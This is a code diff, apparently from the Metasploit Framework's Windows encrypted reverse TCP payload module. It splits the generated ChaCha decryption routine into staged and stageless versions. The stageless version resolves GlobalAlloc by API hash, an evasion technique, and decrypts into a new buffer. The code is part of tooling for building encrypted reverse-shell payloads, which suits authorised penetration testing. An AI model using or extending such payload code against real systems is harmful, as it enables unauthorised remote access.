@@ -59,7 +59,12 @@ module Payload::Windows::EncryptedReverseTcp
     src = headers
     src << '  #include "64BitHelper.h"' if self.arch_to_s.eql?(ARCH_X64)
     src << chacha_key
-    src << chacha_func
+
+    if staged?
+      src << chacha_func_staged
+    else
+      src << chacha_func
+    end
     src << exit_proc
   end
 
@@ -169,7 +174,7 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def chacha_func
+  def chacha_func_staged
     %Q^
       char *chacha_data(char *buf, int len)
       {
@@ -182,6 +187,22 @@ module Payload::Windows::EncryptedReverseTcp
 
         return buf;
       }
+    ^
+  end
+
+  def chacha_func
+    %Q^
+      char *chacha_data(char *buf, int len)
+        {
+          chacha_ctx ctx;
+          chacha_keysetup(&ctx, KEY, 256, 96);
+          chacha_ivsetup(&ctx, NONCE);
+          FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
+          char *out = GlobalAlloc(GMEM_FIXED, sizeof(char) * (len + 1));
+          chacha_encrypt_bytes(&ctx, buf, out, len);
+          out[len] = '\\0';
+          return out;
+        }
     ^
   end
 
